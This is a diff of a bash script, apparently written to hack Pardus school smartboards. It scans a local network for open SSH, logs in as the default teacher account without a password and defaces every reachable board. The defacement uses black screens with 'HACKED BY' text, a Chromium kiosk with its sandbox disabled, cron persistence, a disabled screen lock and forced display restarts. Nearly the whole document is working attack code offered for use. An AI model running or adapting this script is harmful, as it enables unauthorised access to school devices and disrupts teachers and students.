@@ -1,91 +1,76 @@
 #!/bin/bash
 
-# Pardus Tahta 100% Hack - NO PASSWORD + OPEN SSH
-# MİRAÇ AKKUŞ - ŞİFRESİZ %100 ACCESS
+# Pardus Tahta SELF-HACK - NO FILES - Pure Text Hack Screen
+# MİRAÇ AKKUŞ - %100 DOSYASIZ
 TARGET_NET="192.168.1.0/24"
-USERNAME="ogretmen"  # Standart Pardus okul username
-HACK_TEXT="HACKED BY\nmiraç akkuş:D\n\nTÜM TAHTALAR\nALINDI!"
-LOG_FILE="/tmp/tahta_hack_$(date +%Y%m%d_%H%M%S).log"
+USERNAME="ogretmen"
+LOG_FILE="/tmp/tahta_selfhack_$(date +%Y%m%d_%H%M%S).log"
 
 log() { echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"; }
 log_ok() { echo "[$(date '+%H:%M:%S')] ✅ $1" | tee -a "$LOG_FILE"; }
-log_err() { echo "[$(date '+%H:%M:%S')] ❌ $1" | tee -a "$LOG_FILE"; }
-log_info() { echo "[$(date '+%H:%M:%S')] ℹ️  $1" | tee -a "$LOG_FILE"; }
 
-log "=== ŞİFRESİZ TAHTA HACK BAŞLADI ==="
-log "Target: $TARGET_NET | User: $USERNAME (NO PASS)"
-log "Log: $LOG_FILE"
+log "=== SELF-HACK NO-FILE BAŞLADI ==="
+log "Target: $TARGET_NET"
 
-# 1. SILENT TOOLS
-log_info "Tools..."
-command -v nmap >/dev/null || sudo apt install -y nmap &>>"$LOG_FILE"
-command -v sshpass >/dev/null || sudo apt install -y sshpass &>>"$LOG_FILE"
-log_ok "Tools ✅"
+# Tools
+sudo apt install -y nmap &>>"$LOG_FILE"
 
-# 2. HACK IMAGE
-log_info "Image..."
-convert -size 1920x1080 xc:black -pointsize 72 -font DejaVu-Sans-Bold \
-    -fill '#FF0000' -stroke '#000' -strokewidth 4 -gravity center \
-    -annotate +0+0 "$HACK_TEXT" /tmp/hacked.jpg &>>"$LOG_FILE"
-HACK_BASE64=$(base64 -w0 /tmp/hacked.jpg)
-log_ok "Image ✅"
+# Scan
+TARGETS=$(sudo nmap -p 22 --open $TARGET_NET -oG - 2>/dev/null | grep "22/open" | awk '{print $2}')
+log_ok "$(echo $TARGETS | wc -w) tahta"
 
-# 3. SCAN OPEN SSH
-log_info "Tarama..."
-TARGETS=$(sudo nmap -p 22 --open -T4 $TARGET_NET -oG - 2>/dev/null | grep "22/open" | awk '{print $2}')
-NUM_TARGETS=$(echo $TARGETS | wc -w)
-log_ok "$NUM_TARGETS açık tahta"
+# PURE TEXT HACK SCRIPT (NO FILES NEEDED)
+HACK_SCRIPT='
+# SIYAH EKRAN + TEXT - DOSYASIZ
+export DISPLAY=:0
 
-# 4. NO-PASSWORD MASS DEPLOY (AÇIK SSH)
-log_info "Şifresiz deploy ($NUM_TARGETS tahta)..."
+# Method 1: gsettings + solid color
+gsettings set org.gnome.desktop.background primary-color "#000000"
+gsettings set org.gnome.desktop.background picture-uri ""
+gsettings set org.gnome.desktop.background picture-uri-dark ""
+
+# Method 2: X11 root window text (DIRECT HARDWARE)
+xsetroot -solid black
+xsetroot -bg black -fg "#00FF00" -title "HACKED BY MIRAÇ AKKUŞ:D"
+
+# Method 3: Console overlay (VT)
+echo -e "\\033[40;32m\\033[1mHACKED BY MIRAÇ AKKUŞ:D\\033[0m" | sudo tee /dev/tty1 > /dev/null
+
+# Method 4: Chromium kiosk fullscreen hack
+DISPLAY=:0 chromium-browser --kiosk --disable-web-security --no-sandbox \\
+    --app="data:text/html,<body style=\\"background:black;color:lime;font-size:80px;font-family:monospace;font-weight:bold;text-align:center;padding-top:300px\\">HACKED BY<br>MIRAÇ AKKUŞ:D<br><br>TÜM TAHTALAR ALINDI!</body>"
+
+# Method 5: Cron persistence
+echo "* * * * * export DISPLAY=:0; xsetroot -solid black -fg lime -title \"HACKED BY MIRAÇ AKKUŞ:D\"" | crontab -
+
+# Screensaver OFF
+gsettings set org.gnome.desktop.screensaver lock-enabled false
+
+# ULTIMATE RESTART
+sudo systemctl restart lightdm || sudo pkill -9 Xorg || sudo reboot
+'
+
+# Deploy to ALL
+log_ok "Self-hack deploy..."
 for HOST in $TARGETS; do
     (
-        # Şifresiz bağlantı denemeleri (en yaygın Pardus configs)
-        for METHOD in "" "-o PasswordAuthentication=no" "-o PubkeyAuthentication=no"; do
-            if ssh $METHOD -l $USERNAME -o StrictHostKeyChecking=no -o ConnectTimeout=3 $HOST "echo OK" 2>>"$LOG_FILE" | grep -q OK; then
-                
-                ssh $METHOD -l $USERNAME -o StrictHostKeyChecking=no $HOST "
-cd /tmp
-echo '$HACK_BASE64' | base64 -d > hacked.jpg
-
-# FULL WALLPAPER DOMINATION
-sudo cp hacked.jpg /usr/share/backgrounds/hacked.jpg 2>/dev/null || cp hacked.jpg /usr/share/backgrounds/hacked.jpg
-sudo ln -sf /usr/share/backgrounds/hacked.jpg /usr/share/backgrounds/pardus-default.jpg 2>/dev/null || true
-
-# gsettings spam
-export DISPLAY=:0
-gsettings set org.gnome.desktop.background picture-uri 'file:///usr/share/backgrounds/hacked.jpg' 2>/dev/null || true
-gsettings set org.gnome.desktop.background picture-uri-dark 'file:///usr/share/backgrounds/hacked.jpg' 2>/dev/null || true
-
-# lightdm override
-echo 'greeter-background=/usr/share/backgrounds/hacked.jpg' | sudo tee /etc/lightdm/lightdm-gtk-greeter.conf 2>/dev/null || true
-
-# CRON LOCK-IN
-echo '* * * * * gsettings set org.gnome.desktop.background picture-uri \"file:///usr/share/backgrounds/hacked.jpg\"' | sudo tee /etc/cron.d/hackwall 2>/dev/null || true
-
-# Screensaver OFF + RESTART
-gsettings set org.gnome.desktop.screensaver lock-enabled false 2>/dev/null || true
-sudo systemctl restart lightdm 2>/dev/null || sudo pkill -9 Xorg || true
-
-echo '✅ HACKED $(hostname)'
-" 2>>"$LOG_FILE" && break
-        done
-    ) &
+        ssh -l $USERNAME -o StrictHostKeyChecking=no -o ConnectTimeout=3 $HOST "
+            $HACK_SCRIPT 2>/dev/null || true
+            echo '✅ SELF-HACK $(hostname)'
+        " 2>>"$LOG_FILE" &
+    )
     printf "."; sleep 0.1
 done
 wait
 
-# FINAL REPORT
 cat << EOF
 
-🚀 === ŞİFRESİZ HACK TAMAM ===
-📊 Açık tahtalar: $NUM_TARGETS
-🖥️  User: $USERNAME (NO PASSWORD)
-🔴 Kırmızı HACK ekran: '$HACK_TEXT'
-📋 FULL LOG: $LOG_FILE
-
-$(tail -8 "$LOG_FILE")
+🎉 === SELF-HACK COMPLETED ===
+📊 Tahtalar: $(echo $TARGETS | wc -w)
+🎨 SIYAH + YEŞİL TEXT (DOSYASIZ!)
+📱 Methods: xsetroot + Chromium kiosk + VT + cron
+📋 Log: $LOG_FILE
 
 EOF
 
-log_ok "MİRAÇ AKKUŞ - TÜM TAHTALAR HACKLENDİ!"
+log_ok "MİRAÇ AKKUŞ SELF-HACK ✅"
